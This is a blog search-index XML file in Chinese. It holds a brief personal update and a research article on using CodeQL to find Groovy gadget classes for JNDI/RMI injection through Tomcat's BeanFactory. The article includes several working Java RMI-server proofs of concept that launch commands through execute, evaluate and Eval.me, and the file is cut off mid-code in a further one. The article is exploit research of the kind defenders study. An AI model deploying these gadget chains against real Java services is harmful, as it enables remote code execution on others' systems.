<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>停更的两年</title>
      <link href="/2024/11/16/2024/"/>
      <url>/2024/11/16/2024/</url>
      
        <content type="html"><![CDATA[<h1 id="在阿里-停更的两年"><a href="#在阿里-停更的两年" class="headerlink" title="在阿里-停更的两年"></a>在阿里-停更的两年</h1><h2 id="0x00-近况"><a href="#0x00-近况" class="headerlink" title="0x00 近况"></a>0x00 近况</h2><p>​    翻了翻博客，上一次更新还是在华为实习的时候，写codeql找JNDI原生利用链的文章。两年过去，当时二十岁的人现在已经二十三了（春风若有怜花意 可否许我再少年？作为部门里至今还是最年轻的员工说这句话有点不好意思哈哈哈哈哈）</p><p><img src="https://s2.loli.net/2024/11/18/PdVFe1XmGvYUcx4.jpg" alt="mmexport1731665358882"></p><p>​    </p><p>​    </p><p>​    </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>codeql_for_jndi</title>
      <link href="/2022/07/11/codeql-for-jndi/"/>
      <url>/2022/07/11/codeql-for-jndi/</url>
      
        <content type="html"><![CDATA[<h1 id="codeql-with-JNDI-RMI"><a href="#codeql-with-JNDI-RMI" class="headerlink" title="codeql with JNDI RMI"></a>codeql with JNDI RMI</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今年年初浅蓝师傅发了两篇探索高版本 JDK 下 JNDI 漏洞利用方法的文章，拜读之后一直没时间自己进行探索，正巧最近在工作期间学习codeql相关姿势，看了一下关于寻找高版本JDK下RMI可利用的类及方法的条件，很适合使用codeql写规则探索，于是在这里记录一下自己的探索过程。</p><p>写在前面，m1yuu技术有限，文中有些出错的地方或者未表达清晰的细节还请各位大佬斧正</p><p>本文首发于tttang <a href="http://tttang.com/archive/1660/">http://tttang.com/archive/1660/</a></p><h2 id="0x01-构建codeql"><a href="#0x01-构建codeql" class="headerlink" title="0x01 构建codeql"></a>0x01 构建codeql</h2><p>本文聚焦于利用<code>BeanFactory#getObjectInstance</code>扩大攻击面之后的利用方式探索。我们稍微回忆一下需要寻找的类/方法需要满足的条件，方便构造codeql语句进行查询：</p><h3 id="对类的限制"><a href="#对类的限制" class="headerlink" title="对类的限制"></a>对类的限制</h3><p>我们寻找的类需要满足：</p><ul><li>该类存在定义好的构造方法（Constructor）</li><li>该构造方法为public</li><li>该构造方法无参</li></ul><p>m1yuu特意把构造方法Constructor用英文标出</p><blockquote><p>codeql的使用规则和书写方式总结虽然官方给的很齐全，但是国内中文相关的文档还是不完善，如果想了解关于某些元素的codeql方法或者使用方式可以去官方library查询：<a href="https://codeql.github.com/codeql-standard-libraries/search.html%EF%BC%8C%E8%BF%99%E9%87%8C%E5%85%B3%E4%BA%8EConstructor%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%8Cm1yuu%E5%8E%BB%E6%9F%A5%E8%AF%A2%E5%88%B0%E4%BA%86%60getAConstructor()%60">https://codeql.github.com/codeql-standard-libraries/search.html，这里关于Constructor的使用，m1yuu去查询到了`getAConstructor()`</a></p></blockquote><p>构造<code>UsableClass</code>：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class UsableClass extends RefType {    UsableClass<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="对方法的限制"><a href="#对方法的限制" class="headerlink" title="对方法的限制"></a>对方法的限制</h3><p>我们寻找的方法需要满足：</p><ul><li>声明为public</li><li>只有一个参数</li><li>此参数为String类型</li><li>该方法存在于上文提到的类中</li></ul><p>构造<code>UsableMethod</code>：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class UsableMethod extends Method {    UsableMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAParamType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"String"</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="尝试运行codeql"><a href="#尝试运行codeql" class="headerlink" title="尝试运行codeql"></a>尝试运行codeql</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass UsableClass extends RefType {    UsableClass<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}class UsableMethod extends Method {    UsableMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAParamType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"String"</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}<span class="token keyword">from</span> UsableMethod me<span class="token punctuation">,</span> UsableClass cla<span class="token keyword">where</span>    me<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cla<span class="token keyword">select</span> cla<span class="token punctuation">,</span>me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>去lgtm拖了groovy的codeql数据库（<a href="https://lgtm.com/projects/g/apache/groovy/ci/%EF%BC%89%EF%BC%8C%E6%9C%AC%E5%9C%B0%E5%AF%BC%E5%85%A5vscode%E4%B9%8B%E5%90%8E%E8%BF%90%E8%A1%8C%E4%B8%8A%E8%BF%B0codeql%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%BB%93%E6%9E%9C%E7%A1%AE%E5%AE%9E%E6%B2%A1%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E6%90%9C%E7%B4%A2%E5%88%B0%E7%9A%84%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E5%9D%87%E6%BB%A1%E8%B6%B3%E9%A2%84%E6%9C%9F%E6%9D%A1%E4%BB%B6%E3%80%82%E4%BD%86%E6%98%AF%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82%E5%8F%AF%E4%BB%A5%E7%BC%A9%E5%B0%8F%E7%BB%93%E6%9E%9C%E9%9B%86%E5%90%88%EF%BC%8C%E5%9C%A8%E6%9F%A5%E6%89%BE%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C%E4%B8%AD%E6%9C%89%E4%B8%80%E9%83%A8%E5%88%86%E6%98%AF%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%99%E4%BA%9B%E9%9C%80%E8%A6%81%E4%BB%8E%E7%BB%93%E6%9E%9C%E4%B8%AD%E5%88%A0%E5%8E%BB%EF%BC%8C%E4%BA%8E%E6%98%AF%E4%BF%AE%E6%94%B9%E8%84%9A%E6%9C%AC%EF%BC%9A">https://lgtm.com/projects/g/apache/groovy/ci/），本地导入vscode之后运行上述codeql脚本，结果确实没有问题，搜索到的类和方法均满足预期条件。但是有一个细节可以缩小结果集合，在查找到的结果中有一部分是抽象类和抽象方法，这些需要从结果中删去，于是修改脚本：</a></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass UsableClass extends RefType {    UsableClass<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> <span class="token operator">not</span> this<span class="token punctuation">.</span>isAbstract<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}class UsableMethod extends Method {    UsableMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAParamType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"String"</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> <span class="token operator">not</span> this<span class="token punctuation">.</span>isAbstract<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}<span class="token keyword">from</span> UsableMethod me<span class="token punctuation">,</span> UsableClass cla<span class="token keyword">where</span>    me<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cla<span class="token keyword">select</span> cla<span class="token punctuation">.</span>getPackage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cla<span class="token punctuation">,</span>me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在select中多选择了一个<code>cla.getPackage()</code>，方便在寻找利用点的时候查看其所在的包。</p><h2 id="0x02-groovy筛选结果"><a href="#0x02-groovy筛选结果" class="headerlink" title="0x02 groovy筛选结果"></a>0x02 groovy筛选结果</h2><p>我们筛选一下扫描后的结果，找到以下可以利用的点：</p><h4 id="RCE-addClasspath-amp-amp-loadClass"><a href="#RCE-addClasspath-amp-amp-loadClass" class="headerlink" title="RCE:addClasspath&amp;&amp;loadClass"></a>RCE:addClasspath&amp;&amp;loadClass</h4><p><img src="https://s2.loli.net/2022/07/08/ZyNFU9qr1zuAfT3.png" alt="image-20220705144059855"></p><p>这里是浅蓝师傅找到的利用点，先用<code>addClasspath</code>加载远程挂载的<code>groovy</code>脚本，再使用<code>loadClass</code>进行加载。直接给出原文地址</p><p><a href="https://tttang.com/archive/1405/#toc_groovyclassloader">https://tttang.com/archive/1405/#toc_groovyclassloader</a></p><p>就像浅蓝师傅在文中提到的那样，</p><blockquote><p>因为 Groovy 已经有一个 <code>groovy.lang.GroovyShell</code>可以用了，所以这个类并不能体现出价值。</p></blockquote><p>在单个第三方包中有一个利用点就够了，没有必要去接着挖掘。但为了测试我们脚本的准确性（来都来了），m1yuu想尽量把结果中的可利用方式列出来。</p><h4 id="RCE-execute"><a href="#RCE-execute" class="headerlink" title="RCE:execute"></a>RCE:execute</h4><p>这个就比较明显了，是groovyshell中执行命令的相关方法</p><p><img src="https://s2.loli.net/2022/07/08/sokmnqgy3H4fAIi.png" alt="image-20220705145319474"></p><p>poc:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.codehaus.groovy.runtime.ProcessGroovyMethods"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE-evaluate"><a href="#RCE-evaluate" class="headerlink" title="RCE:evaluate"></a>RCE:evaluate</h4><p>果然e开头的方法都值得探究。这里就相当于直接在<code>groovyshell</code>下执行一段命令</p><p><img src="https://s2.loli.net/2022/07/08/jWbFaz8ViN4YTSq.png" alt="image-20220705145735147"></p><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.lang.GroovyShell"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=evaluate"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"\"calc\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以默认方式实例化<code>GroovyCodeSource</code>为<code>gcs</code>，带入到<code>evaluate</code>中使用<code>parse</code>方法解析后执行</p><p><img src="https://s2.loli.net/2022/07/08/mofE7IesQLU3AKh.png" alt="image-20220705151336604"></p><p><img src="https://s2.loli.net/2022/07/08/X417iKkBN3F89pH.png" alt="image-20220705151552679"></p><p>最后会走到<code>execute</code>方法，与前文一致。</p><h4 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE:me"></a>RCE:me</h4><p><img src="https://s2.loli.net/2022/07/08/LfhNWCpyjSRFPsK.png" alt="image-20220705152103184"></p><p>这个<code>me</code>方法听起来很人畜无害，但是其所处的类名是<code>Eval</code>，这就引起了我的注意。进入后发现其可控参数传入了<code>evaluate</code>。直接给出poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.util.Eval"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=me"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"\"calc\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/08/yUeAEf3GSPF7cNd.png" alt="image-20220705153530549"></p><h4 id="RCE-parse"><a href="#RCE-parse" class="headerlink" title="RCE:parse"></a>RCE:parse</h4><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token 